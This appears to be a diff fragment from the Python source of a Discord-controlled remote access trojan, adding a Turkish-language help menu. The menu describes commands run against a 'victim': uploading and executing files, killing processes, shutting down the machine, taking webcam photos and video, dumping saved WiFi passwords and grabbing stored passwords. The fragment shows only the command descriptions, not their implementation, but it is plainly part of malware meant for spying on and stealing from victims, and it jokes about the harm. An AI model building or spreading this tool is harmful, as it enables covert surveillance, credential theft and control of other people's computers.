+    helpembed.add_field(name="sysinfo", value="Uzun bir şey mi okumak istiyorsunuz? Sistem bilgisini okuyalım.", inline=False)
+    helpembed.add_field(name="upload", value=r"Kurbana bir hediye verin! Kullanım : upload C:\\tam\\yol\\hediyeniz (ve bir dosya ekleyin)", inline=False)
+    helpembed.add_field(name="capsrandtroll", value="Bunu troll görün! Kullanım : capsrandtroll 10 (saniye anlamında)", inline=False)
+    helpembed.add_field(name="visitsite", value="Gezinin!", inline=False)
+    helpembed.add_field(name="shutdown", value="Belki kurban GTA V indiriyordu ve %99'da kaldı haha :>", inline=False)
+    helpembed.add_field(name="tasklist", value="Kurbanın bilgisayarında hangi programların açık olduğunu görelim", inline=False)
+    helpembed.add_field(name="taskkill", value="Bir programı veya oyunu kurbanın bilgisayarında kapatabilirsiniz :>", inline=False)
+    helpembed.add_field(name="write", value="Kurbanın bilgisayarına bir cümle yazın", inline=False)
+    helpembed.add_field(name="moveto", value="Kurbanın faresini hareket ettirin! Kullanım : moveto 100, 300 (moveto x y)", inline=False)
+    helpembed.add_field(name="webcamlist", value="Webcam listesini görün", inline=False)
+    helpembed.add_field(name="cameraphoto", value="Bir selfie daha!", inline=False)
+    helpembed.add_field(name="execute", value="Bir dosyayı çalıştırın! Kullanım : execute <yol>", inline=False)
+    helpembed.add_field(name="recordvideo", value="İstediğiniz kadar kayıt yapın! Kullanım : recordvideo 10.0 (evet, float olarak unutmuşum)", inline=False)
+    helpembed.add_field(name="wifipasswords", value="Kurbanın daha önce bağlandığı WiFi'leri ve şifrelerini görün!", inline=False)
+    helpembed.add_field(name="grab", value="Kurbanın şifrelerini alın!", inline=False)
 
     await ctx.send(embed=helpembed)
 
